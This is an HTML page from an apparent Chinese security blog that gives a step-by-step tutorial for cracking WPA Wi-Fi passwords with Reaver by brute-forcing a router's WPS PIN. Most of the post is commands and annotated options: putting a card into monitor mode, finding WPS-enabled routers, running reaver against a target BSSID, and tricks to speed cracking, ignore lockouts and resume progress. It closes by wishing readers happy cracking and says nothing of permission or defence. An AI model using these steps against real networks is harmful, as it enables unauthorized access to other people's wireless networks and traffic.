@@ -1,0 +1,274 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  <title>Reaver 攻击WPA网络 | IterNull - Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <link rel="alternate" href="/atom.xml" title="IterNull - Blog" type="application/atom+xml">
+  
+
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <link rel="stylesheet" href="/css/lib/bootstrap.css" type="text/css"/>
+  <link rel="stylesheet" href="/css/lib/font-awesome.min.css" type="text/css"/>
+  <link rel="stylesheet" href="/css/lib/blog.css" type="text/css"/>
+  <link rel="stylesheet" href="/css/lib/share-box.css" type="text/css">
+  <link rel="stylesheet" href="/css/lib/highlight.css" type="text/css">
+
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <header class="header">
+<!-- Fixed navbar -->
+<nav class="navbar navbar-inverse navbar-fixed-top">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/" title="万物即联网，万物皆可黑；">IterNull - Blog</a>
+    </div>
+    <div class="navbar-collapse collapse">
+      <ul class="nav navbar-nav">
+        
+        <li><a href="//www.irernull.com/">Home</a></li>
+        
+        <li><a href="/about">About</a></li>
+        
+        <li><a href="//blog.iternull.com/">Blog</a></li>
+        
+        <li><a href="//docs.iternull.com/">Docs</a></li>
+        
+        <li><a href="//buy.iternull.com/">Buy</a></li>
+        
+      </ul>
+      <div class="search">
+  <form class="navbar-form navbar-right" action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="hidden" name="q" value="site:blog.iternull.com">
+    <input type="search" class="form-control col-lg-8" name="q" results="0" placeholder="Search">
+  </form>
+</div>
+
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="blog-header">
+    <h1 class="blog-title">IterNull - Blog</h1>
+    
+    <p class="lead blog-description">万物即联网，万物皆可黑；</p>
+    
+  </div>
+</div>
+</header>
+
+  <div class="container">
+    <div class="row">
+        <!-- 左边区域 -->
+        <div class="col-lg-9 col-md-9 col-sm-8 blog-main">
+          <article class="article blog-post" itemscope itemprop="blogPost">
+
+  <div class="article-inner">
+
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      Reaver 攻击WPA网络
+    </h1>
+  
+
+
+
+    </header>
+
+    <div class="article-meta">
+      <div class="article-datetime">
+  <a href="/posts/2015/05/25/Reaver-Attack-WPA.html" class="article-date"><time datetime="2015-05-25T15:07:40.000Z" itemprop="datePublished">2015-05-25</time></a>
+</div>
+
+      
+      
+
+    </div>
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Reaver-介绍"><a href="#Reaver-介绍" class="headerlink" title="Reaver 介绍"></a>Reaver 介绍</h2><p>Reaver 一个对的WiFi保护设置，PIN功能进行暴力攻击的程序。<br><a id="more"></a><br>PIN码破解简单解释：<br>PIN码分前4和后4，先破前4只有最多一万个组合，破后4中的前3只有一千个组合，一共就是一万一千个密码组合。<br>10的4次方+10的3次方=11000个密码组合。当reaver确定前4位PIN密码后，其任务进度数值将直接跳跃至90.9%以上，<br>也就是说只剩余一千个密码组合了。总共一万一千个密码！</p>
+<h2 id="1、安装Reaver"><a href="#1、安装Reaver" class="headerlink" title="1、安装Reaver"></a>1、安装Reaver</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install reaver</div></pre></td></tr></table></figure>
+<h2 id="2、关闭网络和受影响进程"><a href="#2、关闭网络和受影响进程" class="headerlink" title="2、关闭网络和受影响进程"></a>2、关闭网络和受影响进程</h2><p>关闭网络管理器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service network-manager stop</div></pre></td></tr></table></figure>
+<p>结束影响进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng check <span class="built_in">kill</span></div></pre></td></tr></table></figure>
+<h2 id="3、监听无线网络"><a href="#3、监听无线网络" class="headerlink" title="3、监听无线网络"></a>3、监听无线网络</h2><p>激活无线网卡至monitor即监听模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng start wlan0</div></pre></td></tr></table></figure></p>
+<p>监听周围的无线网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng mon0</div></pre></td></tr></table></figure></p>
+<p>查看周围所有开启WPS的无线路由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wash -i mon0 -C</div></pre></td></tr></table></figure></p>
+<h2 id="4、使用Reaver破解无线网络的WPA密码"><a href="#4、使用Reaver破解无线网络的WPA密码" class="headerlink" title="4、使用Reaver破解无线网络的WPA密码"></a>4、使用Reaver破解无线网络的WPA密码</h2><p>执行破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver -i mon0 -b [BSSID] -a -S -vv</div></pre></td></tr></table></figure></p>
+<p>等待一段时间，时间长度从几小时到几十小时不等，从下图可以看到得出的密码</p>
+<p><img src="/data/images/2015-05-25_03-0001.png" alt=""></p>
+<p>使用已知的PIN值破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver -i mon0 -b [BSSID] –a –S –vv -p XXXX</div></pre></td></tr></table></figure></p>
+<p>如果一直PIN不动，尝试加 <code>-N</code> 参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver -i mon0 -b [BSSID] -a -S -vv -d 0 -N</div></pre></td></tr></table></figure></p>
+<p>不是所有的路由都支持pin学习。AP关闭了WPS、或者没有QSS滴，会出现<br>WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX)</p>
+<h2 id="5、Reaver-参数详解"><a href="#5、Reaver-参数详解" class="headerlink" title="5、Reaver 参数详解"></a>5、Reaver 参数详解</h2><h3 id="Options-必须参数"><a href="#Options-必须参数" class="headerlink" title="Options: (必须参数)"></a>Options: (必须参数)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-i, –interface=&lt;wlan&gt; Name of the monitor-mode interface to use</div><div class="line">// 网卡的监视接口，通常是mon0</div><div class="line"></div><div class="line">-b, –bssid=&lt;mac&gt; BSSID of the target AP</div><div class="line">// 目标AP的MAC地址(SSID)</div></pre></td></tr></table></figure>
+<h3 id="Optional-Arguments-可选参数"><a href="#Optional-Arguments-可选参数" class="headerlink" title="Optional Arguments: (可选参数)"></a>Optional Arguments: (可选参数)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">-m, –mac=&lt;mac&gt; MAC of the host system</div><div class="line">// 指定本机MAC地址</div><div class="line"></div><div class="line">-e, –essid=&lt;ssid&gt; ESSID of the target AP</div><div class="line">// 目标AP的ESSID，一般不用指定</div><div class="line"></div><div class="line">-c, –channel=&lt;channel&gt; Set the 802.11 channel for the interface (implies -f)</div><div class="line">// 设置接口的802.11信道 (意味着 -f) 如果不指定会自动扫描</div><div class="line"></div><div class="line">-o, –out-file=&lt;file&gt; Send output to a log file [stdout]</div><div class="line">// 标准输出到文件</div><div class="line"></div><div class="line">-s, –session=&lt;file&gt; Restore a previous session file</div><div class="line">// 恢复进程文件</div><div class="line"></div><div class="line">-C, –exec=&lt;command&gt; Execute the supplied command upon successful pin recovery</div><div class="line">// PIN成功后执行的命令</div><div class="line"></div><div class="line">-D, –daemonize Daemonize reaver</div><div class="line">// 设置Reaver成Daemon (后台)</div><div class="line"></div><div class="line">-a, –auto Auto detect the best advanced options for the target AP</div><div class="line">// 对目标AP自动检测高级参数</div><div class="line"></div><div class="line">-f, –fixed Disable channel hopping</div><div class="line">// 禁止频道跳转</div><div class="line"></div><div class="line">-5, –5ghz Use 5GHz 802.11 channels</div><div class="line">// 使用5GHz的802.11信道</div><div class="line"></div><div class="line">-v, –verbose Display non-critical warnings (-vv for more)</div><div class="line">// 显示不重要警告信息 (-vv 可以显示更多)</div><div class="line"></div><div class="line">-q, –quiet Only display critical messages</div><div class="line">// 只显示关键信息</div><div class="line"></div><div class="line">-h, –help Show help</div><div class="line">// 显示帮助</div></pre></td></tr></table></figure>
+<h3 id="Advanced-Options-高级选项"><a href="#Advanced-Options-高级选项" class="headerlink" title="Advanced Options: (高级选项)"></a>Advanced Options: (高级选项)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">-p, –pin=&lt;wps pin&gt; Use the specified 4 or 8 digit WPS pin</div><div class="line">// 使用指定的4位或者8位PIN码</div><div class="line"></div><div class="line">-d, –delay=&lt;seconds&gt; Set the delay between pin attempts [1]</div><div class="line">// 设置PIN尝试之间的延迟，默认1秒</div><div class="line"></div><div class="line">-l, –lock-delay=&lt;seconds&gt; Set the time to wait if the AP locks WPS pin attempts [60]</div><div class="line">// 设置AP锁定WPS后等待时间，默认为60秒</div><div class="line"></div><div class="line">-g, –max-attempts=&lt;num&gt; Quit after num pin attempts</div><div class="line">// 最多PIN多少次后退出</div><div class="line"></div><div class="line">-x, –fail-wait=&lt;seconds&gt; Set the time to sleep after 10 unexpected failures [0]</div><div class="line">// 10次意外失败后等待时间，默认0秒</div><div class="line"></div><div class="line">-r, –recurring-delay=&lt;x:y&gt; Sleep for y seconds every x pin attempts</div><div class="line">// 每x次PIN后等待y秒</div><div class="line"></div><div class="line">-t, –timeout=&lt;seconds&gt; Set the receive timeout period [5]</div><div class="line">// 收包超时，默认5秒</div><div class="line"></div><div class="line">-T, –m57-timeout=&lt;seconds&gt; Set the M5/M7 timeout period [0.20]</div><div class="line">// M5/M7超时，默认0.2秒</div><div class="line"></div><div class="line">-A, –no-associate Do not associate with the AP (association must be done by another application)</div><div class="line">// 不连入AP（连入过程必须有其他程序完成）</div><div class="line"></div><div class="line">-N, –no-nacks Do not send NACK messages when out of order packets are received</div><div class="line">// 不发送NACK信息（如果一直PIN不动，可以尝试这个参数）</div><div class="line"></div><div class="line">-S, –dh-small Use small DH keys to improve crack speed</div><div class="line">// 使用小DH关键值提高速度（推荐使用）</div><div class="line"></div><div class="line">-L, –ignore-locks Ignore locked state reported by the target AP</div><div class="line">// 忽略目标AP报告的锁定状态</div><div class="line"></div><div class="line">-E, –eap-terminate Terminate each WPS session with an EAP FAIL packet</div><div class="line">// 每当收到EAP失败包就终止WPS进程</div><div class="line"></div><div class="line">-n, –nack Target AP always sends a NACK [Auto]</div><div class="line">// 对目标AP总是发送NACK，默认自动</div><div class="line"></div><div class="line">-w, –win7 Mimic a Windows 7 registrar [False]</div><div class="line">// 模拟Win7注册，默认关闭</div></pre></td></tr></table></figure>
+<h2 id="6、Reaver-使用技巧"><a href="#6、Reaver-使用技巧" class="headerlink" title="6、Reaver 使用技巧"></a>6、Reaver 使用技巧</h2><p>Reaver PIN码破特点：</p>
+<ol>
+<li>不需要客户端，</li>
+<li>有PIN码就能获得无线密码，</li>
+<li>八位数PIN码实际只有一万一千组随机密码，</li>
+<li>抓包、EWSA跑包，每个环节都有很大的不确定性。而PIN破密，只要开户WPS，破密只是个时间问题。</li>
+</ol>
+<h3 id="1、PIN码重复出现死循环解决之道"><a href="#1、PIN码重复出现死循环解决之道" class="headerlink" title="1、PIN码重复出现死循环解决之道"></a>1、PIN码重复出现死循环解决之道</h3><p>当你看到PIN到一定程度，窗口里的PIN码不变，进度百分比也不走，那么，打开一个新终端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver -i mon0 -b [BSSID] -a -s -vv		// 注意：这里&quot;S&quot;要小写</div></pre></td></tr></table></figure></p>
+<p>你就会发现原来PIN的窗口，PIN码开始改变，进度开始前进了！而且PIN的时间也大为缩短了！</p>
+<p>若到90.9%或99.9%还是不出，也可以试试以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver -i mon0 -b [BSSID] -v -a -n [-c]</div></pre></td></tr></table></figure></p>
+<p>时间及经验总结，基本90.9%和99.9%的死循环，已经100%成功了，最后祝大家破解愉快！</p>
+<h3 id="2、终止进程，保存进度方便下次使用"><a href="#2、终止进程，保存进度方便下次使用" class="headerlink" title="2、终止进程，保存进度方便下次使用"></a>2、终止进程，保存进度方便下次使用</h3><p>当你需要暂停时可以使用 <code>Crtl + C</code> 终止进程，Reaver会自动保存进度。<br>Reave的进度表文件保存在:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.3版本：/etc/reaver/&quot;MAC Address.wpc&quot;</div><div class="line">1.4版本：/usr/local/etc/reaver/&quot;MAC Address.wpc&quot;</div></pre></td></tr></table></figure></p>
+<p>重启后会消失，可以复制到其他地方，下次重启动后，再手工复制到对应的目录下即可。</p>
+<h3 id="3、加快破解"><a href="#3、加快破解" class="headerlink" title="3、加快破解"></a>3、加快破解</h3><p>程序默认每尝试后停止一秒，加入 <code>-d0</code> 参数使之不停止<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver -i mon0 -b C8:3A:35:F6:BB:B8 -vv -d0</div></pre></td></tr></table></figure></p>
+<h3 id="4、利用已知的PIN值快速破解"><a href="#4、利用已知的PIN值快速破解" class="headerlink" title="4、利用已知的PIN值快速破解"></a>4、利用已知的PIN值快速破解</h3><p>在命令后加入<code>-p</code> 参数，可以让你在获取到PIN的情况下直接得到路由WPA密码！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver-i mon0 -b [BSSID] -p [PIN]</div></pre></td></tr></table></figure></p>
+<h3 id="5、减慢破解速度使设备避免宕机"><a href="#5、减慢破解速度使设备避免宕机" class="headerlink" title="5、减慢破解速度使设备避免宕机"></a>5、减慢破解速度使设备避免宕机</h3><p>出现 <code>timeout</code> 时，可适当调整网卡方位。<br>在同一PIN数值反复测试，也可Ctrl+C终止破密，让路由器休息几十秒，否则个别型号AP会自锁PIN连接功能。<br>也可以给命令增加2个参数，延长PIN穷举和反馈的响应时间避免路由当机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reaver -i mon0 -b [BSSID] -a -S -vv -d 3 -t 3</div></pre></td></tr></table></figure></p>
+<ul>
+<li>-d 即delay每穷举一次的闲置时间预设为1秒</li>
+<li>-t 即timeout每次穷举等待反馈的最长时间</li>
+</ul>
+<h3 id="6、查看AP是否开了WPS、QSS"><a href="#6、查看AP是否开了WPS、QSS" class="headerlink" title="6、查看AP是否开了WPS、QSS"></a>6、查看AP是否开了WPS、QSS</h3><p>在使用 <code>airodump -ng mon0</code> 监听网络的时候看 <code>MB</code> 列 是否出现 <code>54e.</code> 看清楚有点”.”是开WPS的<br>AP关闭了WPS或者没有QSS滴，会出现 <strong>“WARNING: Failed to associate with XX:XX:XX:XX:XX:XX  (ESSID: XXXX)”</strong></p>
+<p>PIN破密对信号要求极为严格，如果信号稍差，可能导致破密进度变慢或者路由死锁等 (重复同一个PIN码 或 timeout)<br>特别是 <code>1</code> <code>6</code> 默认频道中，有较多的AP，相互干扰。因此，确定网卡放置的最佳位置、方向、角度十分重要。<br>破解过程中重复同一个PIN码或timeout可随时随地按Ctrl+C终止，Reaver会自动保存进度。<br>若继续破，再次执行上次的命令，运行后会让你选 <code>y</code> 或 <code>n</code> ，选 <code>y</code> 后就继续了。<br>当Reaver确定前4位PIN密码后，其工作完成任务进度数值将直接跳跃至90.9%以上，也就是说只剩余一千个密码组合了。总共一万一千个密码。</p>
+<h3 id="7、wpc文件结构解释"><a href="#7、wpc文件结构解释" class="headerlink" title="7、wpc文件结构解释"></a>7、wpc文件结构解释</h3><p>WPC文件结构 前 <code>3</code> 行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0      // 这个地方是说它的前4位PIN码的进度位置数，真实位置要+4</div><div class="line">0      // 这个地方是说后3位PIN数的已经运行测试位置数</div><div class="line">0      // 0时没有找到，当为1时找到前四位，当为2时全部找到</div></pre></td></tr></table></figure></p>
+<p>下面是1万个前四位数 (Reaver1.3版4位随机数，1.4版是升序) 从第 <code>4</code> 行起<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0000</div><div class="line">0001</div><div class="line">....</div><div class="line">....</div><div class="line">9999</div></pre></td></tr></table></figure></p>
+<p>下面是1千个三位数 (PIN第八位数是验证码) 从第 <code>1004</code> 行起<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">000</div><div class="line">...</div><div class="line">...</div><div class="line">999</div></pre></td></tr></table></figure></p>
+<p>所以前四位很重要，如我们要从 <code>3000</code> 开始PIN你可以将文件第一行修改为 <code>3004</code> 这样它就会从 <code>3000</code> 开始PIN了</p>
+<hr>
+<ul>
+<li>注：本人参考了网上各种版本的教程后综合编写的</li>
+</ul>
+
+      
+    </div>
+
+    
+      
+
+    
+
+    <footer class="article-footer">
+      <a data-url="https://blog.iternull.com/posts/2015/05/25/Reaver-Attack-WPA.html" data-id="cixw7frsw002c8ouuf1nkp2du" class="article-share-link">
+        <i class="fa fa-share"></i> Share
+      </a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reaver/">Reaver</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WiFi/">WiFi</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+<ul id="article-nav" class="nav nav-pills nav-justified">
+  
+  <li role="presentation">
+    <a href="/posts/2015/05/26/Hexo-ToTop.html" id="article-nav-newer" class="btn btn-default">
+      <i class="fa fa-chevron-left pull-left"></i>
+      <span class="article-nav-link-title">Hexo 添加返回顶部功能</span>
+    </a>
+  </li>
+  
+  
+  <li role="presentation">
+    <a href="/posts/2015/05/25/Aircrack-ng-Attack-WPA.html" id="article-nav-older" class="btn btn-default">
+      <span class="article-nav-link-title">Aircrack-ng 攻击WPA网络</span>
+      <i class="fa fa-chevron-right pull-right"></i>
+    </a>
+  </li>
+  
+</ul>
+
+
+  
+</article>
+
+
+
+
+        </div>
+        <!-- 右边区域 -->
+        <div class="col-lg-3 col-md-3 col-sm-4 blog-sidebar">
+          <div class="row-offcanvas row-offcanvas-left">
+  
+    
+<div id="widget-tagcloud" class="widget">
+  <div class="list-group">
+    <h4 class="list-group-item active">标签云</h4>
+      <div class="panel panel-default">
+        <div class="panel-body">
+          <a href="/tags/433-MHz/" style="font-size: 10px;">433 MHz</a> <a href="/tags/ADS-B/" style="font-size: 10px;">ADS-B</a> <a href="/tags/Aircrack-ng/" style="font-size: 12.5px;">Aircrack-ng</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/DOS/" style="font-size: 10px;">DOS</a> <a href="/tags/EMP/" style="font-size: 10px;">EMP</a> <a href="/tags/FFmpeg/" style="font-size: 10px;">FFmpeg</a> <a href="/tags/GPG/" style="font-size: 10px;">GPG</a> <a href="/tags/GoAgent/" style="font-size: 10px;">GoAgent</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/Kali/" style="font-size: 10px;">Kali</a> <a href="/tags/Kali-Linux/" style="font-size: 12.5px;">Kali Linux</a> <a href="/tags/Keyborad/" style="font-size: 10px;">Keyborad</a> <a href="/tags/Links/" style="font-size: 10px;">Links</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/Lock/" style="font-size: 10px;">Lock</a> <a href="/tags/Make/" style="font-size: 10px;">Make</a> <a href="/tags/Mouse/" style="font-size: 10px;">Mouse</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/NFC/" style="font-size: 10px;">NFC</a> <a href="/tags/NetHunter/" style="font-size: 10px;">NetHunter</a> <a href="/tags/Network/" style="font-size: 10px;">Network</a> <a href="/tags/Ngrok/" style="font-size: 10px;">Ngrok</a> <a href="/tags/Nightcore/" style="font-size: 10px;">Nightcore</a> <a href="/tags/OpenVAS/" style="font-size: 12.5px;">OpenVAS</a> <a href="/tags/RC522/" style="font-size: 10px;">RC522</a> <a href="/tags/RFID/" style="font-size: 10px;">RFID</a> <a href="/tags/Radio/" style="font-size: 10px;">Radio</a> <a href="/tags/Raspberry-Pi/" style="font-size: 17.5px;">Raspberry Pi</a> <a href="/tags/Reaver/" style="font-size: 10px;">Reaver</a> <a href="/tags/SecUSB/" style="font-size: 10px;">SecUSB</a> <a href="/tags/Selfoss/" style="font-size: 10px;">Selfoss</a> <a href="/tags/Shadowsocks/" style="font-size: 10px;">Shadowsocks</a> <a href="/tags/Shell/" style="font-size: 10px;">Shell</a> <a href="/tags/Sphinx/" style="font-size: 10px;">Sphinx</a> <a href="/tags/Synergy/" style="font-size: 10px;">Synergy</a> <a href="/tags/Text/" style="font-size: 10px;">Text</a> <a href="/tags/ToTop/" style="font-size: 10px;">ToTop</a> <a href="/tags/Tools/" style="font-size: 10px;">Tools</a> <a href="/tags/Tor/" style="font-size: 12.5px;">Tor</a> <a href="/tags/Tor-Browser/" style="font-size: 10px;">Tor Browser</a> <a href="/tags/Twitch/" style="font-size: 10px;">Twitch</a> <a href="/tags/USB/" style="font-size: 15px;">USB</a> <a href="/tags/Virus/" style="font-size: 10px;">Virus</a> <a href="/tags/WEP/" style="font-size: 10px;">WEP</a> <a href="/tags/WPA/" style="font-size: 10px;">WPA</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/Weibo/" style="font-size: 10px;">Weibo</a> <a href="/tags/WiFi/" style="font-size: 17.5px;">WiFi</a> <a href="/tags/WinSetupFromUSB/" style="font-size: 10px;">WinSetupFromUSB</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/bash-completion/" style="font-size: 10px;">bash-completion</a> <a href="/tags/onion/" style="font-size: 10px;">onion</a>
+        </div>
+      </div>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+<div id="widget-blogroll" class="widget">
+  <div class="list-group">
+    <h4 class="list-group-item active">友情链接</h4>
+    
+    <a class="list-group-item" href="http://freedom.moe/" target="_blank">音符の新世界</a>
+    
+    <a class="list-group-item" href="https://ysicing.net/" target="_blank">YsiCing&#39;s Blog</a>
+    
+    <a class="list-group-item" href="http://www.wangqianfang.com/" target="_blank">往前方</a>
+    
+    <a class="list-group-item" href="https://www.lynx.im/" target="_blank">Yay Ka-Boom-Boom</a>
+    
+  </div>
+</div>
+
+
+  
+</div>
+
+        </div>
+    </div>
+    <hr>
+  </div>
+  <footer class="footer">
+  <div class="container">
+    <div id="footer-info" class="inner">
+      <span>&copy; 2017 ZMOM1031</span><br>
+      <span>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+      <span>& Theme by <a href="https://github.com/ZMOM1031/hexo-theme-cyborg-blog" target="_blank">Cyborg-Blog</a></span>
+    </div>
+  </div>
+</footer>
+
+  
+
+<script src="/js/jquery-1.12.4.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+</body>
+</html>
